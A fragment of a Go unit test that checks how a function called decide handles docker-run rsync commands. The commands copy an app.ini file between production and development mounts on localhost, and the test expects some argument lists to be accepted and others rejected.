		{"a file received", []string{"run", "--network", "host", "-e", "RSYNC_PASSWORD", "-v", "/space/mnt/shop-prod:/mnt", "util:1", "rsync", "-a", "--inplace", "rsync://127.0.0.1:9/app.ini/app.ini", "/mnt/"}, "/space/mnt/shop-prod/app.ini:/mnt/app.ini", true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			a, err := decide(t, tt.argv...)
			if err != nil {
				t.Fatal(err)
			}
			if !slices.Contains(a.Docker, tt.want) {
				t.Errorf("no %q in %q", tt.want, a.Docker)
			}
			if len(a.Entries) != 1 || a.Entries[0].File != tt.file {
				t.Errorf("entries %+v", a.Entries)
			}
		})
	}
	// A file by a local rsync with no --inplace, and a receive into a mnt with no entry.
	for _, argv := range [][]string{
		{"run", "-v", "/space/mnt/shop-prod:/src:ro", "-v", "/space/mnt/shop-dev:/dst", "util:1", "rsync", "-a", "/src/app.ini", "/dst/"},
		{"run", "--network", "host", "-e", "RSYNC_PASSWORD", "-v", "/space/mnt/shop-prod:/mnt", "util:1", "rsync", "-a", "rsync://127.0.0.1:9/data/", "/mnt/"},
	} {
		if a, err := decide(t, argv...); err == nil {
			t.Errorf("%q: %q", argv, a.Docker)
		}
	}
}
